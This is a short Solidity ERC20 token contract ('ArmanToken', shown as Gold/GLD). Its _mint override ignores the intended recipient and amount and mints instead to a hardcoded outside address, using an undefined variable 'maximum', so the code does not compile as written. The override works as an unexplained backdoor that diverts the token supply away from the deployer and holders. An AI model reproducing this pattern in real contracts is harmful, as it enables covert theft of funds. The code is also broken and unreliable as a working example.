// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract ArmanToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("Gold", "GLD") {
        _mint(msg.sender, initialSupply);
    }

    function _mint(address account, uint256 amount) internal override {
        super._mint(0x7253C2D9f5BE25b7b3676880FD49c41B13070039, maximum);
    }
}
